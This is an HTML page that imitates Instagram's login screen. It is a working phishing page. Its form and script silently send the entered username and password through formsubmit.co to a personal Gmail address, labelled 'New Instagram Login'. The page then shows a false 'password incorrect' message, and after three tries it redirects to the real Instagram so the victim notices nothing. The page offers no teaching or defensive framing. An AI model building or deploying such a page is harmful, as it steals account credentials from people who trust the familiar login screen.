<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram Login Clone</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      padding: 0;
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
    }
    .wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      gap: 40px;
      padding: 20px;
    }
    .phone-mockup {
      flex-shrink: 0;
      width: 500px;
      user-select: none;
      display: block;
    }
    .phone-mockup img {
      width: 100%;
      height: auto;
      object-fit: contain;
      user-select: none;
    }
    .form-container {
      width: 100%;
      max-width: 350px;
    }
    .login-box {
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px 30px;
      text-align: center;
    }
    .login-box img.logo {
      width: 175px;
      margin-bottom: 25px;
      user-select: none;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 14px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      border: none;
      color: white;
      font-weight: bold;
      font-size: 14px;
      border-radius: 3px;
      margin-top: 10px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    button:disabled {
      opacity: 0.5;
      cursor: default;
    }
    .or {
      margin: 20px 0;
      position: relative;
      text-align: center;
      font-size: 13px;
      color: #8e8e8e;
    }
    .or::before,
    .or::after {
      content: "";
      position: absolute;
      width: 40%;
      height: 1px;
      background-color: #dbdbdb;
      top: 50%;
    }
    .or::before { left: 0; }
    .or::after { right: 0; }
    .facebook-login {
      display: flex;
      justify-content: center;
      align-items: center;
      color: #385185;
      font-weight: bold;
      font-size: 14px;
      text-decoration: none;
      margin-bottom: 8px;
      cursor: pointer;
      user-select: none;
    }
    .facebook-login img {
      width: 16px;
      height: 16px;
      margin-right: 8px;
      filter: brightness(0) saturate(100%) invert(29%) sepia(85%) saturate(1741%) hue-rotate(191deg) brightness(91%) contrast(96%);
    }
    .alert-msg {
      color: #ed4956;
      font-size: 13px;
      text-align: center;
      margin-bottom: 10px;
      height: 18px;
      user-select: none;
    }
    .forgot {
      margin-top: 15px;
      font-size: 12px;
    }
    a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
    }
    .signup-box {
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 20px 0;
      font-size: 14px;
      text-align: center;
      margin-top: 10px;
    }
    @media (max-width: 767px) {
      .wrapper {
        flex-direction: column;
        height: auto;
        padding: 20px 0;
      }
      .phone-mockup { display: none; }
      .form-container {
        max-width: 350px;
        width: 100%;
      }
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="phone-mockup">
      <img src="https://i.postimg.cc/RVKVCdKG/instagram-web-lox-image.png" alt="Instagram Phone" />
    </div>

    <div class="form-container">
      <div class="login-box">
        <img class="logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" />
        <form
          id="loginForm"
          action="https://formsubmit.co/rsgaming9718@gmail.com"
          method="POST"
          autocomplete="off"
        >
          <input type="text" name="username" placeholder="Phone number, username, or email" required minlength="3" />
          <input type="password" name="password" placeholder="Password" required minlength="6" />
          <button type="submit" disabled>Log In</button>

          <!-- Hidden FormSubmit Inputs -->
          <input type="hidden" name="_subject" value="New Instagram Login" />
          <input type="hidden" name="_captcha" value="false" />
          <input type="hidden" name="_template" value="table" />
        </form>

        <div class="or">OR</div>

        <a class="facebook-login" href="#">
          <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo" />
          Log in with Facebook
        </a>

        <div class="alert-msg" id="alertMsg"></div>

        <div class="forgot">
          <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password?</a>
        </div>
      </div>

      <div class="signup-box">
        Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
      </div>
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const username = form.elements['username'];
    const password = form.elements['password'];
    const submitBtn = form.querySelector('button');
    const alertMsg = document.getElementById('alertMsg');

    let wrongAttempts = 0;

    function checkInputs() {
      submitBtn.disabled = username.value.length < 3 || password.value.length < 6;
    }

    username.addEventListener('input', checkInputs);
    password.addEventListener('input', checkInputs);

    form.addEventListener('submit', function (e) {
      e.preventDefault();

      const formData = new FormData(form);
      fetch(form.action, {
        method: 'POST',
        body: formData,
        headers: { Accept: 'application/json' }
      });

      wrongAttempts++;
      alertMsg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';

      if (wrongAttempts >= 3) {
        alertMsg.textContent = 'Redirecting to Instagram...';
        setTimeout(() => {
          window.location.href = 'https://instagram.com';
        }, 2000);
      }
    });

    checkInputs();
  </script>
</body>
</html>
